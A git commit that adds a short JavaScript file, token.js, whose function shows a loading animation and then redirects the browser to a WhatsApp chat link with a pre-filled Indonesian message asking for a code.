5f3b0bba35b00b82ce2fdf4d40c31bc9a7d0d7a1
masbro4568 <nonokpatok67@gmail.com>
2025-03-30 06:00:46 +0700

    token.js

---
+++ token.js
@@ -0,0 +1,9 @@
+function go(){
+    $("#process1").show();
+    $('.load').fadeIn();   
+   setTimeout(function(){  
+   location.href='https://wa.me/628175727481?text=Hallo%20Min%20fazz,tolong%20kirimi%20saya%20Kode';
+    $("#process1").hide();
+    $('.load').fadeOut();
+    }, 2000);    
+   }     
